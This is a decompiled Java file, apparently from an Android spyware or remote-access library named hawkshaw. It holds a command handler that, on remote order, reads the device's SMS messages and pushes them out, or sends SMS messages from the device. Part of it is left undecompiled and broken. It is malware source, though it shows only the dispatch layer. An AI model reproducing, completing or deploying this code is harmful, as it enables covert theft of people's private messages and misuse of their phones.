package com.hawkshaw.library.features.telephony.messages;

import W2.y;
import a3.e;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;

public final class HandlerKt {
    private static final String TAG = "MessagesHandler";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        static {
            
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushMessages     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SendMessage     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                $EnumSwitchMapping$0 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.messages.HandlerKt.WhenMappings.<clinit>():void");
        }
    }

    public static final Object handleMessagesCommand(Command command, e eVar) {
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        y yVar = y.f2418a;
        if (i5 != 1) {
            if (i5 == 2) {
                sendMessage(command.getSendMessageRequest());
            }
            return yVar;
        }
        Object pushMessages = pushMessages(eVar);
        return pushMessages == C0298a.f4140D ? pushMessages : yVar;
    }

    /* access modifiers changed from: private */
    public static final Object pushMessages(e eVar) {
        boolean hasPermission = ManifestPermissionsKt.hasPermission("android.permission.READ_SMS");
        y yVar = y.f2418a;
        if (!hasPermission) {
            Logger.e$default(Logger.INSTANCE, TAG, "PushMessages(SMS): You don't have permission to read sms", (Exception) null, false, 12, (Object) null);
            return yVar;
        }
        Object pushMessages = GetMessagesKt.pushMessages(App.Companion.getContext(), eVar);
        return pushMessages == C0298a.f4140D ? pushMessages : yVar;
    }

    private static final void sendMessage(Command.SendMessageRequest sendMessageRequest) {
        if (sendMessageRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.SEND_SMS")) {
                Logger.e$default(Logger.INSTANCE, TAG, "SendMessages(SMS): You don't have permission to send sms", (Exception) null, false, 12, (Object) null);
            } else {
                SendMessageKt.sendMessage(App.Companion.getContext(), sendMessageRequest);
            }
        }
    }
}
